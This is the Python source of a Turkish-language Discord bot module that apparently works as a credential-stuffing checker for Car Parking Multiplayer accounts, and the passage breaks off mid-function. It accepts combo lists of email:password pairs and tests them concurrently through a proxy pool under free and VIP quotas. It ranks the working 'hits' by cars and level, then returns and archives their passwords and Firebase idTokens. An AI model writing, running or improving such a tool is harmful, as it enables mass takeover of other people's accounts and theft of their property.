import io
import os
import re
import json
import time
import asyncio
from datetime import datetime
from typing import Optional, List, Tuple
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

from config import MAX_CONCURRENT_TASKS, FREE_LIMIT, VIP_LIMIT, ADMIN_LIMIT, RESULTS_DIR
from cpm_api import check_cpm_account
from database import db
from proxy_manager import proxy_mgr

def render_progress_bar(current: int, total: int, length: int = 12) -> str:
    if total <= 0:
        return "░" * length
    percent = current / total
    filled = int(length * percent)
    return "█" * filled + "░" * (length - filled)

def format_compact_json(data):
    raw = json.dumps(data, indent=2, ensure_ascii=False)
    return re.sub(r'\[\s*([0-9,\s]+?)\s*\]', lambda m: '[' + ', '.join(re.findall(r'\d+', m.group(1))) + ']', raw)

def parse_combo_lines(text: str) -> List[dict]:
    accounts = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" in line:
            parts = line.split(":", 1)
            e = parts[0].strip()
            p = parts[1].strip()
            if e and p:
                accounts.append({"email": e, "password": p})
    return accounts

# =============================================================================
# 🚀 CANLI İLERLEMELİ ORTAK TOPLU TARAMA MOTORU (Batch Processing Engine)
# =============================================================================
async def execute_batch_scan(
    bot: commands.Bot,
    raw_accounts: List[dict],
    user_id: int,
    username: str,
    role_ids: List[int],
    progress_edit_fn = None
) -> Tuple[discord.Embed, List[discord.File]]:
    is_vip_user = await db.is_vip(user_id, role_ids)
    user_limit = db.get_user_limit(user_id, is_vip_user)

    total_raw = len(raw_accounts)
    accounts = raw_accounts[:user_limit]
    total = len(accounts)

    limit_notice = ""
    if total_raw > user_limit:
        membership_text = "👑 **VIP Üye**" if is_vip_user else "👤 **Free Üye**"
        limit_notice = f"\n⚠️ *Not: {total_raw} hesap girildi, {membership_text} limitiniz ({user_limit} CPM) kadar tarandı.*"

    start_time = time.time()
    valid_list = []
    invalid_list = []
    processed = 0
    last_update_time = time.time()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)

    session = getattr(bot, "http_session", None)
    close_session = False
    if session is None or session.closed:
        session = aiohttp.ClientSession()
        close_session = True

    async def worker(acc):
        nonlocal processed, last_update_time
        async with semaphore:
            success, data, err_msg = await check_cpm_account(session, acc["email"], acc["password"])
            processed += 1
            if success:
                valid_list.append(data)
            else:
                invalid_list.append((acc, err_msg))

            now = time.time()
            if progress_edit_fn and (processed == total or (now - last_update_time >= 1.8)):
                last_update_time = now
                pct = int((processed / total) * 100) if total > 0 else 0
                bar = render_progress_bar(processed, total, 12)
                elapsed_cur = round(now - start_time, 1)

                prog_embed = discord.Embed(
                    title="⚡ Toplu Hesap Kontrolü Canlı Taranıyor...",
                    description=f"İşlem devam ediyor, lütfen bekleyin...{limit_notice}",
                    color=discord.Color.gold()
                )
                prog_embed.add_field(
                    name="📊 İlerleme Durumu",
                    value=f"`[{bar}] {pct}%` (**{processed}/{total}**)",
                    inline=False
                )
                prog_embed.add_field(name="✅ Çalışan (Hit)", value=f"**`{len(valid_list)}`**", inline=True)
                prog_embed.add_field(name="❌ Hatalı", value=f"`{len(invalid_list)}`", inline=True)
                prog_embed.add_field(name="⏳ Kalan", value=f"`{total - processed}`", inline=True)

                prog_embed.add_field(name="⏱️ Geçen Süre", value=f"`{elapsed_cur}s`", inline=True)
                prog_embed.add_field(name="🌐 Proxy Havuzu", value=f"`{proxy_mgr.count()} aktif`", inline=True)
                prog_embed.set_footer(text=f"Kullanıcı: {username} • Asenkron Turbo Motor")

                try:
                    await progress_edit_fn(prog_embed)
                except Exception:
                    pass

    try:
        tasks = [worker(acc) for acc in accounts]
        await asyncio.gather(*tasks)
    finally:
        if close_session:
            await session.close()

    elapsed = round(time.time() - start_time, 2)

    # İstatistik & Hit Kaydı
    await db.record_scan(user_id, "batch", total, len(valid_list), len(invalid_list), elapsed)
    if valid_list:
        await db.save_batch_hits(user_id, valid_list, username=username)

    # Sıralama
    valid_list.sort(key=lambda x: (x.get('cpm_total_cars') or 0, x.get('cpm_level') or 0), reverse=True)

    # Yerel klasöre hatalı hesapları da kaydet
    user_folder = os.path.join(RESULTS_DIR, username)
    os.makedirs(user_folder, exist_ok=True)

    files_to_send = []

    # 1. calisan_hesaplar_sade.txt
    if valid_list:
        sade_buffer = io.StringIO()
        for acc in valid_list:
            sade_buffer.write(f"{acc['email']}:{acc['password']}\n")
        sade_bytes = io.BytesIO(sade_buffer.getvalue().encode("utf-8"))
        sade_bytes.seek(0)
        files_to_send.append(discord.File(sade_bytes, filename="calisan_hesaplar_sade.txt"))

    # 2. hatali_hesaplar.txt (Öncelikli olarak 2. sıraya koyuyoruz ki Discord'da net görünsün)
    if invalid_list:
        inv_buffer = io.StringIO()
        inv_buffer.write(f"=====================================================\n")
        inv_buffer.write(f"❌ HATALI / AÇILMAYAN HESAPLAR VE NEDENLERİ\n")
        inv_buffer.write(f"Tarih       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        inv_buffer.write(f"Kullanıcı   : {username}\n")
        inv_buffer.write(f"Toplam Hatalı: {len(invalid_list)} adet\n")
        inv_buffer.write(f"=====================================================\n\n")
        for rank, (acc, err) in enumerate(invalid_list, 1):
            inv_buffer.write(f"#{rank} {acc['email']}:{acc['password']}  ➔  [Sebep: {err}]\n")
        
        # Diske de kaydet
        try:
            with open(os.path.join(user_folder, "hatali_hesaplar.txt"), "w", encoding="utf-8") as f:
                f.write(inv_buffer.getvalue())
        except Exception:
            pass

        inv_bytes = io.BytesIO(inv_buffer.getvalue().encode("utf-8"))
        inv_bytes.seek(0)
        files_to_send.append(discord.File(inv_bytes, filename="hatali_hesaplar.txt"))

    # 3. detayli_rapor.txt
    txt_buffer = io.StringIO()
    txt_buffer.write(f"=====================================================\n")
    txt_buffer.write(f"🚗 CPM HESAP CHECKER DETAYLI RAPOR\n")
    txt_buffer.write(f"Tarih       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    txt_buffer.write(f"Kullanıcı   : {username} ({user_id})\n")
    txt_buffer.write(f"Toplam      : {total} | Geçerli: {len(valid_list)} | Hatalı: {len(invalid_list)}\n")
    txt_buffer.write(f"=====================================================\n\n")

    for rank, acc in enumerate(valid_list, 1):
        txt_buffer.write(f"=====================================================\n")
        txt_buffer.write(f"Sıra             : #{rank}\n")
        txt_buffer.write(f"Hesap            : {acc.get('email')}:{acc.get('password')}\n")
        txt_buffer.write(f"UID              : {acc.get('uid')}\n")
        txt_buffer.write(f"CPM Seviye       : Level {acc.get('cpm_level')}\n")
        txt_buffer.write(f"Toplam Açık Araç : {acc.get('cpm_unlocked_cars', acc.get('cpm_total_cars'))} adet\n")
        if acc.get("cpm_unlocked_ids"):
            txt_buffer.write(f"Açık Araç ID'ler : {acc.get('cpm_unlocked_ids')}\n")
        txt_buffer.write(f"Modifiyeli Garaj : {acc.get('cpm_custom_cars', len(acc.get('cpm_cars', [])))} adet\n")
        if acc.get("cpm_custom_ids") or acc.get("cpm_cars"):
            txt_buffer.write(f"Garaj Araç ID'ler: {acc.get('cpm_custom_ids') or acc.get('cpm_cars')}\n")
        if acc.get("cpm_clan_id"):
            txt_buffer.write(f"Klan ID          : {acc.get('cpm_clan_id')}\n")
        prof = acc.get("firebase_profile", {})
        if prof:
            txt_buffer.write(f"Kayıt Tarihi     : {prof.get('createdAt')}\n")
            txt_buffer.write(f"Son Giriş        : {prof.get('lastLoginAt')}\n")
        txt_buffer.write(f"idToken          : {acc.get('idToken')}\n\n")

    txt_bytes = io.BytesIO(txt_buffer.getvalue().encode("utf-8"))
    txt_bytes.seek(0)
    files_to_send.append(discord.File(txt_bytes, filename="detayli_rapor.txt"))

    # 4. detayli_rapor.json
    if valid_list:
        json_str = format_compact_json(valid_list)
        json_bytes = io.BytesIO(json_str.encode("utf-8"))
        json_bytes.seek(0)
        files_to_send.append(discord.File(json_bytes, filename="detayli_rapor.json"))

    final_embed = discord.Embed(
        title="✨ Toplu Tarama Başarıyla Tamamlandı!",
        description=f"**{total}** hesap **{elapsed}** saniyede tarandı ve en dolu hesaplara göre sıralandı.{limit_notice}",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    final_embed.add_field(name="📦 Toplam Taranan", value=f"`{total}`", inline=True)
    final_embed.add_field(name="✅ Çalışan / Hit", value=f"**`{len(valid_list)}`**", inline=True)
    final_embed.add_field(name="❌ Hatalı / Kapalı", value=f"**`{len(invalid_list)}`**", inline=True)

    if valid_list:
        top_summary = [f"**#{r}** `{a['email']}` | 🚗 **{a.get('cpm_total_cars', 0)} Araç** | ⭐ **Lvl {a.get('cpm_level', 0)}**" for r, a in enumerate(valid_list[:5], 1)]
        final_embed.add_field(name="🏆 En Dolu İlk 5 Hesap", value="\n".join(top_summary), inline=False)

    # 🔴 Hatalı Hesapları ve Hata Nedenlerini Doğrudan Mesaja Yazdırıyoruz
    if invalid_list:
        inv_lines = []
        for i, (acc, err) in enumerate(invalid_list[:10], 1):
            inv_lines.append(f"**#{i}** `{acc['email']}` ➔ **{err}**")
        if len(invalid_list) > 10:
            inv_lines.append(f"... ve {len(invalid_list) - 10} hatalı hesap daha (dosyada)")
        final_embed.add_field(name=f"❌ Hatalı Hesaplar ({len(invalid_list)} adet)", value="\n".join(inv_lines), inline=False)

    final_embed.add_field(
        name="💾 Yerel Arşiv",
        value=f"Sonuçlar adınıza özel `results/{username}/` klasörüne kaydedildi.",
        inline=False
    )
    final_embed.set_footer(text=f"İşlem Süresi: {elapsed} sn • CPM Bot")

    return final_embed, files_to_send


# =============================================================================
# 📝 MODALLAR (Pop-up Formlar)
# =============================================================================
class SingleCheckModal(discord.ui.Modal, title="🚗 Tekli CPM Hesap Kontrolü"):
    email_input = discord.ui.TextInput(
        label="E-Posta (veya email:şifre)",
        placeholder="ornek@gmail.com veya ornek@gmail.com:123456",
        required=True
    )
    password_input = discord.ui.TextInput(
        label="Şifre",
        placeholder="Eğer ilk alana email:şifre yazdıysanız boş bırakın",
        required=False
    )

    def __init__(self, bot: commands.Bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        email = self.email_input.value.strip()
        pwd = self.password_input.value.strip()

        if ":" in email and not pwd:
            parts = email.split(":", 1)
            target_email = parts[0].strip()
            target_pass = parts[1].strip()
        else:
            target_email = email
            target_pass = pwd

        if not target_email or not target_pass:
            await interaction.followup.send("❌ Lütfen geçerli bir e-posta ve şifre girin!", ephemeral=True)
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, target_email, target_pass)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(interaction.user.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success:
            await db.save_hit(interaction.user.id, details, username=interaction.user.name)

            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            status_text = "🟢 **Temiz / Aktif**" if can_play == 1 else "🔴 **Kısıtlı / Yasaklı**"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⭐ Seviye (Level)", value=f"**Level {level}**", inline=True)

            embed.add_field(name="🚗 Açık Araçlar", value=f"**{unlocked_cnt}** adet", inline=True)
            embed.add_field(name="🏎️ Garaj Araçları", value=f"**{custom_cnt}** adet", inline=True)
            embed.add_field(name="🏆 Toplam Araç", value=f"**{total_cars}** adet", inline=True)

            embed.add_field(name="🛡️ Rapor / Durum", value=f"`{reports}` rapor ({status_text})", inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.add_field(name="🆔 UID", value=f"`{details.get('uid', '-')}`", inline=False)

            embed.set_footer(text=f"💾 results/{interaction.user.name}/ klasörüne kaydedildi.")
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⚠️ Hata Nedeni", value=f"**{err_msg}**", inline=False)
            await interaction.followup.send(embed=embed, ephemeral=True)


class BatchCheckModal(discord.ui.Modal, title="📋 Toplu CPM Hesap Listesi Yapıştır"):
    combos_input = discord.ui.TextInput(
        label="Hesaplar (Her satıra bir adet email:şifre)",
        style=discord.TextStyle.paragraph,
        placeholder="hesap1@gmail.com:123456\nhesap2@gmail.com:654321\nhesap3@gmail.com:secret",
        required=True,
        max_length=4000
    )

    def __init__(self, bot: commands.Bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=False)

        accounts = parse_combo_lines(self.combos_input.value)
        if not accounts:
            await interaction.followup.send("❌ Geçerli `email:şifre` satırı bulunamadı!", ephemeral=True)
            return

        initial_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        initial_msg = await interaction.followup.send(embed=initial_embed)

        async def edit_progress(embed):
            try:
                await interaction.followup.edit_message(message_id=initial_msg.id, embed=embed)
            except Exception:
                pass

        role_ids = [r.id for r in interaction.user.roles] if interaction.guild and isinstance(interaction.user, discord.Member) else []
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=interaction.user.id,
            username=interaction.user.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await initial_msg.delete()
        except Exception:
            pass

        await interaction.followup.send(embed=final_embed, files=files)


# =============================================================================
# 🚗 CHECKPANEL VIEW (BUTONLAR)
# =============================================================================
class CheckPanelView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    # 1. Buton: 🔍 Tekli Kontrol (Form)
    @discord.ui.button(label="Tekli Kontrol", style=discord.ButtonStyle.primary, emoji="🔍", row=0)
    async def btn_single_check(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SingleCheckModal(self.bot))

    # 2. Buton: 📋 Toplu Liste Yapıştır (Form)
    @discord.ui.button(label="Toplu Liste Yapıştır", style=discord.ButtonStyle.success, emoji="📋", row=0)
    async def btn_batch_paste(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BatchCheckModal(self.bot))

    # 3. Buton: 📁 Toplu Dosya Rehberi
    @discord.ui.button(label="Dosya ile Toplu Tarama", style=discord.ButtonStyle.secondary, emoji="📁", row=0)
    async def btn_batch_guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(
            title="📁 TXT Dosyası ile Toplu Tarama",
            description="İçinde `email:şifre` olan `.txt` dosyanızı yüklemek için:\n\n"
                        "1. **Slash Komutu:** `/toplu_kontrol dosya:...`\n"
                        "2. **Prefix Komutu:** Dosyayı ekleyip mesaja `!toplu` yazın.\n\n"
                        f"• **Free Limit:** `{FREE_LIMIT} CPM`\n"
                        f"• **VIP Limit:** `{VIP_LIMIT} CPM`\n"
                        "• Çalışanlar Discord'dan TXT ve JSON olarak geri verilir ve `results/<isminiz>/` klasörüne arşivlenir.",
            color=discord.Color.gold()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    # 4. Buton: 📊 İstatistiklerim
    @discord.ui.button(label="İstatistiklerim", style=discord.ButtonStyle.secondary, emoji="📊", row=1)
    async def btn_my_stats(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        user_stats = await db.get_user_stats(interaction.user.id)
        role_ids = [r.id for r in interaction.user.roles] if interaction.guild and isinstance(interaction.user, discord.Member) else []
        is_vip_user = await db.is_vip(interaction.user.id, role_ids)
        user_limit = db.get_user_limit(interaction.user.id, is_vip_user)
        membership = "👑 **VIP Üye**" if is_vip_user else "👤 **Free Üye**"

        embed = discord.Embed(title=f"👤 {interaction.user.name} - Kullanıcı İstatistikleri", color=discord.Color.blurple())
        embed.add_field(name="⭐ Üyelik Durumu", value=membership, inline=True)
        embed.add_field(name="⚡ CPM Limiti", value=f"**{user_limit} CPM**", inline=True)
        embed.add_field(name="🚀 Yapılan Tarama", value=f"`{user_stats['scans']}` işlem", inline=True)
        embed.add_field(name="📦 Taranan Hesap", value=f"`{user_stats['total_accs']}` adet", inline=True)
        embed.add_field(name="🎯 Bulunan Hit", value=f"**`{user_stats['hits']}` adet**", inline=True)
        embed.set_footer(text=f"Sonuçlarınız results/{interaction.user.name}/ klasöründe kayıtlıdır.")
        await interaction.followup.send(embed=embed, ephemeral=True)

    # 5. Buton: 🎯 Son Hitlerim
    @discord.ui.button(label="Son Hitlerim", style=discord.ButtonStyle.secondary, emoji="🎯", row=1)
    async def btn_my_hits(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        hits = await db.get_recent_hits(limit=5, user_id=interaction.user.id)
        if not hits:
            await interaction.followup.send("ℹ️ Henüz adınıza kayıtlı bir hit bulunamadı.", ephemeral=True)
            return

        embed = discord.Embed(title="🎯 Son Bulduğunuz 5 Hit Kaydı", color=discord.Color.teal())
        for h in hits:
            embed.add_field(
                name=f"🚗 {h.get('email')}",
                value=f"• Şifre: ||`{h.get('password')}`||\n• Seviye: `Lvl {h.get('level')}` | Araç: `{h.get('total_cars')}`\n• Tarih: `{h.get('created_at')}`",
                inline=False
            )
        await interaction.followup.send(embed=embed, ephemeral=True)


def create_checkpanel_embed() -> discord.Embed:
    embed = discord.Embed(
        title="🚗 Car Parking Multiplayer - Hesap Kontrol Paneli",
        description="Aşağıdaki butonları kullanarak tekli form açabilir, çoklu liste yapıştırabilir veya dosya ile turbo tarama yapabilirsiniz.",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    embed.add_field(name="🔍 Tekli Kontrol", value="Tek hesabı e-posta & şifre formuyla sorgular.", inline=True)
    embed.add_field(name="📋 Toplu Liste Yapıştır", value="Metin kutusuna çoklu hesap yapıştırıp dosyaları indirilebilir verir.", inline=True)
    embed.add_field(name="📁 Dosya ile Tarama", value="`.txt` dosyası yükleyerek turbo tarama yapar.", inline=True)
    embed.add_field(name="👑 Üyelik Limitleri", value=f"• Free: **{FREE_LIMIT} CPM**\n• VIP: **{VIP_LIMIT} CPM**", inline=True)
    embed.add_field(name="💾 Kişisel Klasör", value="Hitleriniz `results/<isminiz>/` klasörüne otomatik kaydedilir.", inline=True)
    embed.set_footer(text="Car Parking Multiplayer & Firebase Checker • !checkpanel")
    return embed


# =============================================================================
# 📌 CHECKER COG
# =============================================================================
class CheckerCog(commands.Cog, name="Checker"):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def get_member_role_ids(self, interaction_or_ctx) -> List[int]:
        if hasattr(interaction_or_ctx, "guild") and interaction_or_ctx.guild:
            author = getattr(interaction_or_ctx, "user", getattr(interaction_or_ctx, "author", None))
            if isinstance(author, discord.Member):
                return [r.id for r in author.roles]
        return []

    # =========================================================================
    # 🚗 /checkpanel ve !checkpanel
    # =========================================================================
    @app_commands.command(name="checkpanel", description="İnteraktif CPM Hesap Kontrol Panelini açar.")
    async def cmd_checkpanel_slash(self, interaction: discord.Interaction):
        embed = create_checkpanel_embed()
        view = CheckPanelView(self.bot)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

    @commands.command(name="checkpanel", aliases=["cp", "checkerpanel"])
    async def cmd_checkpanel_prefix(self, ctx: commands.Context):
        """DM ve Sunucuda !checkpanel komutu"""
        embed = create_checkpanel_embed()
        view = CheckPanelView(self.bot)
        await ctx.reply(embed=embed, view=view)

    # =========================================================================
    # 📌 /check (Tekli Kontrol - Slash)
    # =========================================================================
    @app_commands.command(name="check", description="Tek bir CPM hesabını kontrol eder ve detaylarını getirir.")
    @app_commands.describe(
        email="Hesap e-posta adresi (veya email:şifre formatında combo)",
        sifre="Hesap şifresi (eğer ilk alana email:şifre yazdıysanız boş bırakabilirsiniz)",
        gizli="Sonucu sadece siz görecek şekilde gizli (ephemeral) göndersin mi? (Varsayılan: Evet)"
    )
    async def cmd_check(
        self,
        interaction: discord.Interaction,
        email: str,
        sifre: str = "",
        gizli: bool = True
    ):
        await interaction.response.defer(ephemeral=gizli)

        if ":" in email and not sifre:
            parts = email.split(":", 1)
            target_email = parts[0].strip()
            target_pass = parts[1].strip()
        else:
            target_email = email.strip()
            target_pass = sifre.strip()

        if not target_email or not target_pass:
            await interaction.followup.send("❌ Lütfen geçerli bir e-posta ve şifre girin!", ephemeral=gizli)
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, target_email, target_pass)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(interaction.user.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success:
            await db.save_hit(interaction.user.id, details, username=interaction.user.name)

            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            uid = details.get("uid", "Bilinmiyor")
            prof = details.get("firebase_profile", {})
            status_text = "🟢 **Temiz / Aktif**" if can_play == 1 else "🔴 **Kısıtlı / Yasaklı**"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⭐ Seviye (Level)", value=f"**Level {level}**", inline=True)

            embed.add_field(name="🚗 Açık Araçlar", value=f"**{unlocked_cnt}** adet", inline=True)
            embed.add_field(name="🏎️ Garaj Araçları", value=f"**{custom_cnt}** adet", inline=True)
            embed.add_field(name="🏆 Toplam Araç", value=f"**{total_cars}** adet", inline=True)

            embed.add_field(name="🛡️ Rapor Sayısı", value=f"`{reports}` rapor", inline=True)
            embed.add_field(name="🎮 Oyun Durumu", value=status_text, inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.add_field(name="🆔 UID", value=f"`{uid}`", inline=False)

            if prof:
                created = prof.get("createdAt", "Bilinmiyor")
                last_login = prof.get("lastLoginAt", "Bilinmiyor")
                embed.add_field(name="📅 Kayıt Tarihi", value=f"`{created}`", inline=True)
                embed.add_field(name="🕒 Son Giriş", value=f"`{last_login}`", inline=True)

            embed.set_footer(text=f"Sorgulayan: {interaction.user.name} • results/{interaction.user.name}/ klasörüne kaydedildi 💾")
            await interaction.followup.send(embed=embed, ephemeral=gizli)

        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⚠️ Hata Nedeni", value=f"**{err_msg}**", inline=False)
            embed.set_footer(text=f"Sorgulayan: {interaction.user.name}")
            await interaction.followup.send(embed=embed, ephemeral=gizli)

    # =========================================================================
    # 📌 /toplu_kontrol (Slash)
    # =========================================================================
    @app_commands.command(name="toplu_kontrol", description="Dosya yükleyerek VEYA doğrudan liste yapıştırarak toplu CPM kontrolü yapar.")
    @app_commands.describe(
        dosya="İçinde satır satır email:şifre olan .txt dosyası (opsiyonel)",
        liste="Doğrudan metin olarak alt alta email:şifre listesi (opsiyonel)",
        gizli="Sonuç sadece size mi görünsün? (Varsayılan: Hayır)"
    )
    async def cmd_batch_check(
        self,
        interaction: discord.Interaction,
        dosya: Optional[discord.Attachment] = None,
        liste: Optional[str] = None,
        gizli: bool = False
    ):
        if not dosya and not liste:
            await interaction.response.send_modal(BatchCheckModal(self.bot))
            return

        await interaction.response.defer(ephemeral=gizli)

        text_content = ""
        if dosya:
            try:
                content_bytes = await dosya.read()
                text_content = content_bytes.decode("utf-8", errors="ignore")
            except Exception as e:
                await interaction.followup.send(f"❌ Dosya okunurken hata oluştu: {e}", ephemeral=gizli)
                return
        elif liste:
            text_content = liste

        accounts = parse_combo_lines(text_content)
        if not accounts:
            await interaction.followup.send("❌ Geçerli `email:şifre` satırı bulunamadı!", ephemeral=gizli)
            return

        init_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        init_msg = await interaction.followup.send(embed=init_embed, ephemeral=gizli)

        async def edit_progress(embed):
            try:
                await interaction.followup.edit_message(message_id=init_msg.id, embed=embed)
            except Exception:
                pass

        role_ids = await self.get_member_role_ids(interaction)
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=interaction.user.id,
            username=interaction.user.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await init_msg.delete()
        except Exception:
            pass

        await interaction.followup.send(embed=final_embed, files=files, ephemeral=gizli)

    # =========================================================================
    # 📌 PREFİX (!) KOMUTLAR
    # =========================================================================
    @commands.command(name="check", aliases=["c", "tekli"])
    async def prefix_check(self, ctx: commands.Context, *, args: str = None):
        """DM ve Sunucuda !check email:şifre veya !check email şifre"""
        if not args:
            await ctx.reply("❌ Kullanım: `!check email:şifre` veya `!check email şifre`")
            return

        args = args.strip()
        if ":" in args:
            p = args.split(":", 1)
            email = p[0].strip()
            pwd = p[1].strip()
        elif " " in args:
            parts = args.split(None, 1)
            email = parts[0].strip()
            pwd = parts[1].strip()
        else:
            await ctx.reply("❌ Lütfen geçerli bir e-posta ve şifre girin! Örnek: `!check ornek@gmail.com:123456`")
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, email, pwd)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(ctx.author.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success:
            await db.save_hit(ctx.author.id, details, username=ctx.author.name)
            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            status_text = "🟢 Temiz / Aktif" if can_play == 1 else "🔴 Kısıtlı"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{pwd}`||", inline=True)
            embed.add_field(name="⭐ Seviye", value=f"Level {level}", inline=True)
            embed.add_field(name="🚗 Toplam Araç", value=f"**{total_cars}** adet (Açık: {unlocked_cnt}, Garaj: {custom_cnt})", inline=True)
            embed.add_field(name="🛡️ Rapor / Durum", value=f"`{reports}` rapor ({status_text})", inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.add_field(name="🆔 UID", value=f"`{details.get('uid', '-')}`", inline=False)
            embed.set_footer(text=f"💾 results/{ctx.author.name}/ klasörüne kaydedildi.")
            await ctx.reply(embed=embed)
        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red())
            embed.add_field(name="📧 E-Posta", value=f"`{email}`", inline=True)
            embed.add_field(name="⚠️ Hata", value=f"**{err_msg}**", inline=True)
            await ctx.reply(embed=embed)

    # 📌 !toplu
    @commands.command(name="toplu", aliases=["toplu_kontrol", "batch", "combocheck"])
    async def prefix_batch(self, ctx: commands.Context, *, combo_text: str = None):
        text_content = ""

        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            if attachment.filename.endswith((".txt", ".text", ".csv", ".json")):
                try:
                    content_bytes = await attachment.read()
                    text_content = content_bytes.decode("utf-8", errors="ignore")
                except Exception as e:
                    await ctx.reply(f"❌ Dosya okunurken hata oluştu: {e}")
                    return

        if not text_content and combo_text:
            text_content = combo_text

        if not text_content:
            await ctx.reply(
                "❌ **Kullanım Yolları:**\n"
                "1. Bir `.txt` dosyası ekleyip `!toplu` yazın.\n"
                "2. VEYA doğrudan mesaja yazın:\n"
                "```text\n!toplu\nhesap1@gmail.com:123456\nhesap2@gmail.com:654321\n```"
            )
            return

        accounts = parse_combo_lines(text_content)
        if not accounts:
            await ctx.reply("❌ Geçerli `email:şifre` satırı bulunamadı!")
            return

        start_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        progress_msg = await ctx.reply(embed=start_embed)

        async def edit_progress(embed):
